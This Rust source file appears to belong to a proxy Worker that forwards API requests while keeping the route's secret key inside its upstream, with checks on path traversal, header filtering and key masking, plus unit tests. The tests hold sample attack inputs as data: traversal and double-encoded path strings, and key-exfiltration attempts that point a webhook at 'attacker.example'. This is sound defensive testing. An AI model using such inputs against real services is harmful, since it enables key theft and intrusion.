//! Build the upstream request for a route, refuse anything that would
//! leave the route's upstream or move its key, and mask the key out of
//! replies.
//!
//! The upstream, the secret and where the secret goes come from the
//! Worker's config, never from the caller. The caller only supplies `rest`
//! and the query; both are checked twice: lexically here, then by comparing
//! the parsed target's scheme / host / port / path prefix with the
//! upstream's.

use url::Url;

use crate::route::{KeyAt, Route, PLACEHOLDER, RESERVED};
use crate::{Code, Error};

/// What the Worker sends upstream.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Target {
    pub url: String,
    /// Header to set (lowercase name, value), from the route's template.
    pub header: Option<(String, String)>,
}

fn bad(m: &str) -> Error {
    Error::new(Code::BadRequest, m.to_string())
}

fn forbidden(m: &str) -> Error {
    Error::new(Code::Forbidden, m.to_string())
}

/// `https://host[:port][/base]`, no userinfo, query or fragment.
pub fn parse_upstream(upstream: &str) -> Result<Url, Error> {
    let u = Url::parse(upstream).map_err(|_| bad("upstream is not a URL"))?;
    if u.scheme() != "https" {
        return Err(bad("upstream must be https"));
    }
    if u.host_str().is_none() || !u.username().is_empty() || u.password().is_some() {
        return Err(bad("upstream needs a host and no userinfo"));
    }
    if u.query().is_some() || u.fragment().is_some() || upstream.contains('?') {
        return Err(bad("upstream must not carry a query or fragment"));
    }
    Ok(u)
}

/// Headers a route template may never set.
const RESERVED_HEADERS: &[&str] = &[
    "host",
    "cookie",
    "connection",
    "keep-alive",
    "te",
    "trailer",
    "transfer-encoding",
    "upgrade",
    "content-length",
    "proxy-authorization",
    "proxy-connection",
];

pub fn check_header_name(name: &str) -> Result<(), Error> {
    let lower = name.to_ascii_lowercase();
    let token_ok = !name.is_empty()
        && name.len() <= 64
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_');
    if !token_ok
        || RESERVED_HEADERS.contains(&lower.as_str())
        || lower.starts_with("cf-")
        || lower.starts_with("tengu-")
    {
        return Err(bad("header name is not allowed"));
    }
    Ok(())
}

/// Lexical checks on the caller's path remainder and query.
fn check_rest(rest: &str, query: Option<&str>) -> Result<(), Error> {
    let lower = rest.to_ascii_lowercase();
    if rest.starts_with('/')
        || rest.contains('\\')
        || rest.contains("//")
        || rest.contains("://")
        || rest.chars().any(|c| c.is_control() || c == '#' || c == ' ' || c == ';')
        || lower.contains("%2f")
        || lower.contains("%5c")
        || lower.contains("%00")
        // A double-encoded `%2e` / `/` that some upstreams decode twice.
        || lower.contains("%25")
    {
        return Err(forbidden("path is not allowed"));
    }
    for seg in rest.split('/') {
        let s = seg.to_ascii_lowercase().replace("%2e", ".");
        // `.`, `..`, and `..;` / `..x` that Tomcat-style servers treat as `..`.
        if s == "." || s.starts_with("..") {
            return Err(forbidden("path is not allowed"));
        }
    }
    if let Some(q) = query {
        if q.chars().any(|c| c.is_control() || c == '#') {
            return Err(forbidden("query is not allowed"));
        }
    }
    Ok(())
}

/// Same scheme, host, port, and a path inside the upstream's base path.
fn assert_inside(up: &Url, target: &str) -> Result<(), Error> {
    let t = Url::parse(target).map_err(|_| forbidden("target is not a URL"))?;
    let base = up.path().trim_end_matches('/');
    let inside = base.is_empty() || t.path() == base || t.path().starts_with(&format!("{base}/"));
    if t.scheme() != "https"
        || t.host_str() != up.host_str()
        || t.port_or_known_default() != up.port_or_known_default()
        || !t.username().is_empty()
        || t.password().is_some()
        || !inside
    {
        return Err(forbidden("target leaves the route's upstream"));
    }
    Ok(())
}

/// Build the upstream request for `route` + its `secret` + the caller's
/// `rest` / `query`. The key goes only where the route says
/// ([`crate::route::KeyAt`]): a header route refuses any [`PLACEHOLDER`];
/// a path / query route needs exactly one, at its declared spot — so a
/// session holder cannot copy the key into a webhook URL or a message.
/// The route's `allow` list, when set, limits the path after the key part.
pub fn build(
    route: &Route,
    secret: &str,
    rest: &str,
    query: Option<&str>,
) -> Result<Target, Error> {
    let up = parse_upstream(&route.upstream)?;
    check_rest(rest, query)?;
    if secret.is_empty() || secret.chars().any(|c| c.is_control()) {
        return Err(Error::new(
            Code::Misconfigured,
            "the route's Worker secret is empty or has control characters",
        ));
    }
    let query = query.filter(|q| !q.is_empty());
    let count =
        rest.matches(PLACEHOLDER).count() + query.map_or(0, |q| q.matches(PLACEHOLDER).count());
    let key_at = route
        .key_at()
        .ok_or_else(|| Error::new(Code::Misconfigured, "route has no key position"))?;
    // The path the route's `allow` list is checked against.
    let free_path: &str = match key_at {
        KeyAt::Header(..) => {
            if count > 0 {
                return Err(forbidden(
                    "this route takes its key in a header — TENGU_SECRET is not allowed",
                ));
            }
            rest
        }
        KeyAt::Path(templates) => {
            if count != 1 {
                return Err(forbidden(
                    "send TENGU_SECRET exactly once, at the start of the path",
                ));
            }
            templates
                .iter()
                .find_map(|t| after_key(rest, t))
                .ok_or_else(|| {
                    forbidden(&format!(
                        "TENGU_SECRET must start the path as one of: {}",
                        templates.join(", ")
                    ))
                })?
        }
        KeyAt::Query(param) => {
            let exact = format!("{param}={PLACEHOLDER}");
            let in_place = query.is_some_and(|q| q.split('&').any(|kv| kv == exact));
            if count != 1 || !in_place {
                return Err(forbidden(&format!(
                    "send TENGU_SECRET exactly once, as ?{param}=TENGU_SECRET"
                )));
            }
            rest
        }
    };
    if !route.allow.is_empty() && !route.allow.iter().any(|a| under(free_path, a)) {
        return Err(forbidden("this path is not allowed on this route"));
    }
    if count > 0
        && secret
            .chars()
            .any(|c| matches!(c, '/' | '?' | '#' | '@' | '\\' | ' ' | '%' | '&' | '='))
    {
        return Err(Error::new(
            Code::Misconfigured,
            "this route's secret has URL characters; use a header route",
        ));
    }
    let base = route.upstream.trim_end_matches('/');
    let mut url = if rest.is_empty() {
        base.to_string()
    } else {
        format!("{base}/{rest}")
    };
    if let Some(q) = query {
        url.push('?');
        url.push_str(q);
    }
    let url = url.replacen(PLACEHOLDER, secret, 1);
    let header = match key_at {
        KeyAt::Header(n, v) => Some((n.to_ascii_lowercase(), v.replacen("{secret}", secret, 1))),
        _ => None,
    };
    assert_inside(&up, &url)?;
    Ok(Target { url, header })
}

/// The path after a key template (`bot{secret}/` → `getMe`), if `rest`
/// starts with it (with [`PLACEHOLDER`] in place of `{secret}`).
fn after_key<'a>(rest: &'a str, template: &str) -> Option<&'a str> {
    let (pre, post) = template.split_once("{secret}")?;
    let after = rest.strip_prefix(pre)?.strip_prefix(PLACEHOLDER)?;
    if post.is_empty() {
        (after.is_empty() || after.starts_with('/')).then(|| after.trim_start_matches('/'))
    } else {
        after.strip_prefix(post)
    }
}

/// `path` is `prefix` or below it (segment boundary).
fn under(path: &str, prefix: &str) -> bool {
    let p = prefix.trim_end_matches('/');
    path == p || path.starts_with(&format!("{p}/"))
}

/// Split a request path into (route, rest).
///
/// | Request | Route from | Rest |
/// |---|---|---|
/// | `/<route>/<rest>` | the first segment | `<rest>` |
/// | any path + header `Tengu-Route: <route>` | the header (clients that build absolute paths, e.g. teloxide's `/bot<token>/…`) | the path without its `/` |
///
/// `None` for the Worker's own endpoints and malformed paths.
pub fn split_path<'a>(path: &'a str, header_route: Option<&'a str>) -> Option<(&'a str, &'a str)> {
    let p = path.strip_prefix('/')?;
    if RESERVED.contains(&p) {
        return None;
    }
    if let Some(route) = header_route {
        return Some((route, p));
    }
    let (route, rest) = p.split_once('/').unwrap_or((p, ""));
    crate::route::is_route_name(route).then_some((route, rest))
}

/// Request headers the Worker drops before forwarding (lowercase names).
pub fn drop_request_header(name: &str) -> bool {
    let n = name.to_ascii_lowercase();
    RESERVED_HEADERS.contains(&n.as_str())
        || n == "authorization"
        || n.starts_with("cf-")
        || n.starts_with("tengu-")
        || n.starts_with("x-forwarded-")
        || n == "x-real-ip"
        || n == "cdn-loop"
        || n == "forwarded"
        || n == "accept-encoding"
}

/// Replacement for a key found in a reply.
pub const MASK: &str = "[REDACTED]";
/// Reply bodies up to this size are read and masked; a larger one streams
/// through unmasked from that point (memory / CPU budget on the free plan).
pub const MASK_MAX_BYTES: usize = 2 * 1024 * 1024;
/// Shorter keys are not masked (they would cut ordinary words).
pub const MASK_MIN_SECRET: usize = 8;

/// Whether a reply body is text the Worker reads and masks: text / JSON /
/// XML / JavaScript, never an event stream or binary.
pub fn maskable(content_type: Option<&str>) -> bool {
    let ct = content_type.unwrap_or("").to_ascii_lowercase();
    let texty = ct.starts_with("text/")
        || ct.contains("json")
        || ct.contains("xml")
        || ct.contains("javascript");
    texty && !ct.starts_with("text/event-stream")
}

/// Statuses whose reply never has a body (and must not get one).
pub fn null_body(status: u16) -> bool {
    matches!(status, 101 | 204 | 205 | 304)
}

/// Replace every copy of `secret` in `text` (a header value); returns the count.
pub fn mask(text: &str, secret: &str) -> (String, usize) {
    if secret.len() < MASK_MIN_SECRET {
        return (text.to_string(), 0);
    }
    let n = text.matches(secret).count();
    if n == 0 {
        return (text.to_string(), 0);
    }
    (text.replace(secret, MASK), n)
}

/// [`mask`] on raw bytes, so a body that is not valid UTF-8 survives.
pub fn mask_bytes(body: &[u8], secret: &str) -> (Vec<u8>, usize) {
    let needle = secret.as_bytes();
    if needle.len() < MASK_MIN_SECRET || body.len() < needle.len() {
        return (body.to_vec(), 0);
    }
    let mut out = Vec::with_capacity(body.len());
    let (mut i, mut n) = (0, 0);
    while i < body.len() {
        if body.len() - i >= needle.len()
            && body[i] == needle[0]
            && &body[i..i + needle.len()] == needle
        {
            out.extend_from_slice(MASK.as_bytes());
            i += needle.len();
            n += 1;
        } else {
            out.push(body[i]);
            i += 1;
        }
    }
    (out, n)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn header_route(upstream: &str) -> Route {
        Route {
            upstream: upstream.into(),
            secret: "K".into(),
            header: Some("Authorization: Bearer {secret}".into()),
            path: vec![],
            query: None,
            allow: vec![],
        }
    }

    fn path_route(upstream: &str, templates: &[&str]) -> Route {
        Route {
            upstream: upstream.into(),
            secret: "K".into(),
            header: None,
            path: templates.iter().map(|t| t.to_string()).collect(),
            query: None,
            allow: vec![],
        }
    }

    fn query_route(upstream: &str, param: &str) -> Route {
        Route {
            upstream: upstream.into(),
            secret: "K".into(),
            header: None,
            path: vec![],
            query: Some(param.into()),
            allow: vec![],
        }
    }

    #[test]
    fn header_route_joins_path_and_query() {
        let r = header_route("https://openrouter.ai/api");
        let t = build(&r, "sk-1", "v1/chat/completions", None).unwrap();
        assert_eq!(t.url, "https://openrouter.ai/api/v1/chat/completions");
        assert_eq!(
            t.header,
            Some(("authorization".into(), "Bearer sk-1".into()))
        );
        let t = build(&r, "sk-1", "v1/models", Some("a=1")).unwrap();
        assert_eq!(t.url, "https://openrouter.ai/api/v1/models?a=1");
        let t = build(&r, "sk-1", "alpha/decisions", None).unwrap();
        assert_eq!(t.url, "https://openrouter.ai/api/alpha/decisions");
    }

    #[test]
    fn header_route_refuses_the_placeholder_anywhere() {
        let r = header_route("https://openrouter.ai/api");
        for (rest, q) in [
            ("v1/TENGU_SECRET", None),
            ("v1/chat/completions", Some("x=TENGU_SECRET")),
        ] {
            assert_eq!(
                build(&r, "sk-1", rest, q).unwrap_err().code,
                Code::Forbidden
            );
        }
    }

    #[test]
    fn allow_list_limits_paths() {
        let mut r = header_route("https://openrouter.ai/api");
        r.allow = vec!["v1/chat/completions".into(), "alpha/decisions".into()];
        assert!(build(&r, "sk-1", "v1/chat/completions", None).is_ok());
        assert!(build(&r, "sk-1", "alpha/decisions", None).is_ok());
        for rest in ["v1/keys", "v1/chat/completionsX", "v1", ""] {
            assert_eq!(
                build(&r, "sk-1", rest, None).unwrap_err().code,
                Code::Forbidden,
                "{rest}"
            );
        }
    }

    #[test]
    fn path_escapes_are_refused() {
        let r = header_route("https://openrouter.ai/api");
        for rest in [
            "../x",
            "v1/../../x",
            "%2e%2e/x",
            "v1/%2E%2e/x",
            "/etc",
            "a//b",
            "https://evil.example/x",
            "a\\b",
            "a%2fb",
            "a%5cb",
            "a#b",
            "a\nb",
            "v1/models/..;/keys",
            "v1/models/%252e%252e/keys",
            "v1;x=1/models",
            "..x/models",
        ] {
            let e = build(&r, "k", rest, None).unwrap_err();
            assert_eq!(e.code, Code::Forbidden, "{rest}");
        }
    }

    #[test]
    fn path_route_takes_the_key_only_at_its_spot() {
        let tg = path_route(
            "https://api.telegram.org",
            &["bot{secret}/", "file/bot{secret}/"],
        );
        let t = build(&tg, "123:abc", "botTENGU_SECRET/getMe", None).unwrap();
        assert_eq!(t.url, "https://api.telegram.org/bot123:abc/getMe");
        assert_eq!(t.header, None);
        let t = build(&tg, "123:abc", "file/botTENGU_SECRET/photos/a.jpg", None).unwrap();
        assert_eq!(
            t.url,
            "https://api.telegram.org/file/bot123:abc/photos/a.jpg"
        );
        // Exfiltration attempts: a second copy, or the key elsewhere.
        for (rest, q) in [
            (
                "botTENGU_SECRET/setWebhook",
                Some("url=https://attacker.example/TENGU_SECRET"),
            ),
            (
                "botTENGU_SECRET/sendMessage",
                Some("chat_id=1&text=TENGU_SECRET"),
            ),
            ("bot1/sendMessage", Some("text=TENGU_SECRET")),
            ("x/botTENGU_SECRET/getMe", None),
            ("bot1/getMe", None),
        ] {
            assert_eq!(
                build(&tg, "123:abc", rest, q).unwrap_err().code,
                Code::Forbidden,
                "{rest} {q:?}"
            );
        }
        assert_eq!(
            build(&tg, "12/3", "botTENGU_SECRET/getMe", None)
                .unwrap_err()
                .code,
            Code::Misconfigured
        );
        let alchemy = path_route("https://eth-sepolia.g.alchemy.com/v2", &["{secret}"]);
        let t = build(&alchemy, "abcdefgh", "TENGU_SECRET", None).unwrap();
        assert_eq!(t.url, "https://eth-sepolia.g.alchemy.com/v2/abcdefgh");
        assert!(build(&alchemy, "abcdefgh", "TENGU_SECRETx", None).is_err());
    }

    #[test]
    fn query_route_takes_the_key_only_as_its_param() {
        let rpc = query_route("https://mainnet.helius-rpc.com", "api-key");
        let t = build(&rpc, "abc-123", "", Some("api-key=TENGU_SECRET")).unwrap();
        assert_eq!(t.url, "https://mainnet.helius-rpc.com?api-key=abc-123");
        for q in [
            "other=TENGU_SECRET",
            "api-key=TENGU_SECRET&x=TENGU_SECRET",
            "api-key=xTENGU_SECRET",
            "",
        ] {
            assert!(build(&rpc, "abc-123", "", Some(q)).is_err(), "{q}");
        }
        assert!(build(&rpc, "abc-123", "TENGU_SECRET", Some("api-key=1")).is_err());
    }

    #[test]
    fn base_path_boundary() {
        let up = parse_upstream("https://api.example.com/v2").unwrap();
        assert!(assert_inside(&up, "https://api.example.com/v2").is_ok());
        assert!(assert_inside(&up, "https://api.example.com/v2/a").is_ok());
        assert!(assert_inside(&up, "https://api.example.com/v2x").is_err());
        assert!(assert_inside(&up, "https://api.example.com:8443/v2/a").is_err());
        assert!(assert_inside(&up, "https://u@api.example.com/v2/a").is_err());
        assert!(assert_inside(&up, "https://other.example.com/v2/a").is_err());
    }

    #[test]
    fn split_path_forms() {
        assert_eq!(
            split_path("/openrouter/v1/x", None),
            Some(("openrouter", "v1/x"))
        );
        assert_eq!(split_path("/openrouter", None), Some(("openrouter", "")));
        assert_eq!(split_path("/session", None), None);
        assert_eq!(split_path("/whoami", Some("telegram")), None);
        assert_eq!(split_path("/Bad/x", None), None);
        assert_eq!(
            split_path("/botTENGU_SECRET/getMe", Some("telegram")),
            Some(("telegram", "botTENGU_SECRET/getMe"))
        );
        assert_eq!(split_path("", None), None);
    }

    #[test]
    fn request_header_filter() {
        for h in [
            "Authorization",
            "Cookie",
            "Host",
            "CF-Connecting-IP",
            "Tengu-Route",
            "X-Forwarded-For",
        ] {
            assert!(drop_request_header(h), "{h}");
        }
        for h in ["content-type", "accept", "http-referer", "x-title"] {
            assert!(!drop_request_header(h), "{h}");
        }
    }

    #[test]
    fn masking_rules() {
        assert!(maskable(Some("application/json; charset=utf-8")));
        assert!(maskable(Some("text/html")));
        assert!(!maskable(Some("text/event-stream")));
        assert!(!maskable(Some("image/png")));
        assert!(null_body(204) && null_body(304) && !null_body(200));
        let (out, n) = mask(
            r#"{"auth":"Bearer sk-secret-123","echo":"sk-secret-123"}"#,
            "sk-secret-123",
        );
        assert_eq!(n, 2);
        assert!(!out.contains("sk-secret-123"));
        assert_eq!(mask("short k", "k").1, 0);
        let body = [b"\xff\xfe x sk-secret-123 y".as_slice(), b"sk-secret-123"].concat();
        let (out, n) = mask_bytes(&body, "sk-secret-123");
        assert_eq!(n, 2);
        assert_eq!(out, b"\xff\xfe x [REDACTED] y[REDACTED]".to_vec());
        assert_eq!(mask_bytes(b"abc", "sk-secret-123"), (b"abc".to_vec(), 0));
    }
}
